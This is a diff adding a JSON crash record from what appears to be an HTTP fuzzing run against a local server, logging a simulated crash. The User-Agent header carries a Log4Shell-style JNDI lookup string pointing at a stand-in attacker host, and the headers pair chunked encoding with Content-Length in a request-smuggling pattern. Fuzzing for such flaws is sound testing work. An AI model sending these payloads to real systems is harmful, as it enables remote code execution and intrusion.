@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:42:15.176362",
+  "crash_type": "server_crash",
+  "payload": "PUT /sessions/?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-Host': 'http://localhost', 'Transfer-Encoding': 'chunked', 'Content-Length': '44'}",
+  "payload_hash": "34552578687fc420",
+  "request_method": "PUT",
+  "request_path": "/sessions/?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-Host": "http://localhost",
+    "Transfer-Encoding": "chunked",
+    "Content-Length": "44"
+  },
+  "request_body": "",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 360
+}
